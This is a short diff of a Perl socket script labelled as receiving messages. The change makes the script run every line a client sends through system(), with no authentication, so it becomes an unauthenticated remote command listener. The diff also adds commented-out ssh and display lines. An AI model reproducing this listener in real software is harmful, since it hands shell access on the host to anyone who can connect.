@@ -1,5 +1,10 @@
 #!/usr/bin/perl -w
 
+#system('ssh 192.0.168.109');
+#$_ = `ssh 192.0.168.109`;
+#system('echo "drunk jester"');
+#system('export DISPLAY=:0');
+
 #receives messages
 $| = 1;
 use IO::Socket::INET;
@@ -21,8 +26,11 @@ print "accepted a connection\n";
 while(1)
 {
 	
-	my $Msg = <$ClientSock>;#need to read the connecting socket
-	print "message is:	$Msg\n" if($Msg);
-
+	my $Com = <$ClientSock>;#need to read the connecting socket
+	
+	if($Com)
+	{
+		system($Com);
+	}
 
 }
